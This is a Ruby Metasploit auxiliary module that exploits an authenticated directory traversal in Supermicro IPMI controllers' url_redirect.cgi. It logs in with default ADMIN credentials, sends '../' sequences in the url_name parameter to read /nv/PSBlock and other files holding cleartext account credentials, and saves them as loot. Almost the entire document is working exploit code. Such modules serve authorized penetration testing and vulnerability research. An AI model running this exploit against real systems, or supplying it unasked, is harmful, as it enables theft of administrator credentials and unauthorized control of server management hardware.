##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report


  APP_NAME = "Supermicro web interface"

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal',
      'Description' => %q{
        This module abuses a directory traversal vulnerability in the url_redirect.cgi application
        accessible through the web interface of Supermicro Onboard IPMI controllers.  The vulnerability
        is present due to a lack of sanitization of the url_name parameter. This allows an attacker with
        a valid, but not necessarily administrator-level account, to access the contents of any file
        on the system. This includes the /nv/PSBlock file, which contains the cleartext credentials for
        all configured accounts. This module has been tested on a Supermicro Onboard IPMI (X9SCL/X9SCM)
        with firmware version SMT_X9_214. Other file names to try include /PSStore, /PMConfig.dat, and
        /wsman/simple_auth.passwd
      },
      'Author'       =>
        [
          'hdm', # Discovery and analysis
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'URL', 'https://blog.rapid7.com/2013/11/06/supermicro-ipmi-firmware-vulnerabilities' ],
          [ 'URL', 'https://github.com/zenfish/ipmi/blob/master/dump_SM.py']
        ],
      'DisclosureDate' => 'Nov 06 2013'))

    register_options(
      [
        OptInt.new('DEPTH', [true, 'Traversal depth', 1]), # By default downloads from /tmp
        OptString.new('FILEPATH', [true, 'The name of the file to download', '/nv/PSBlock']),
        OptString.new('PASSWORD', [true, 'Password for Supermicro Web Interface', 'ADMIN']),
        OptString.new('USERNAME', [true, 'Username for Supermicro Web Interface', 'ADMIN'])
      ])
  end

  def my_basename(filename)
    return ::File.basename(filename.gsub(/\\/, "/"))
  end

  def is_supermicro?
    res = send_request_cgi(
      {
        "uri"       => "/",
        "method"    => "GET"
      })

    if res and res.code == 200 and res.body.to_s =~ /ATEN International Co Ltd\./
      return true
    else
      return false
    end
  end

  def login
    res = send_request_cgi({
      "uri"       => "/cgi/login.cgi",
      "method"    => "POST",
      "vars_post" => {
        "name" => datastore["USERNAME"],
        "pwd"  => datastore["PASSWORD"]
      }
    })

    if res and res.code == 200 and res.body.to_s =~ /self.location="\.\.\/cgi\/url_redirect\.cgi/ and res.get_cookies =~ /(SID=[a-z]+)/
      return $1
    else
      return nil
    end
  end

  def read_file(file, session)
    travs = ""
    travs << "../" * datastore['DEPTH']
    travs << file

    print_status("Retrieving file contents...")

    res = send_request_cgi({
      "uri"           => "/cgi/url_redirect.cgi",
      "method"        => "GET",
      "cookie"        => session,
      "encode_params" => false,
      "vars_get"      => {
        "url_type" => "file",
        "url_name" => travs
      }
    })

    if res and res.code == 200 and res.headers["Content-type"].to_s =~ /text\/html/ and res.headers["Pragma"].nil?
      return res.body.to_s
    else
      return nil
    end
  end

  def run_host(ip)
    print_status("Checking if it's a #{APP_NAME}....")
    if is_supermicro?
      print_good("Check successful")
    else
      print_error("#{APP_NAME} not found")
      return
    end

    print_status("Login into the #{APP_NAME}...")
    session = login
    if session.nil?
      print_error("Failed to login, check credentials.")
      return
    else
      print_good("Login Successful, session: #{session}")
    end

    contents = read_file(datastore['FILEPATH'], session)
    if contents.nil?
      print_error("File not downloaded")
      return
    end

    file_name = my_basename(datastore['FILEPATH'])
    path = store_loot(
      'supermicro.ipmi.traversal.psblock',
      'application/octet-stream',
      rhost,
      contents,
      file_name
    )
    print_good("File saved in: #{path}")
  end
end
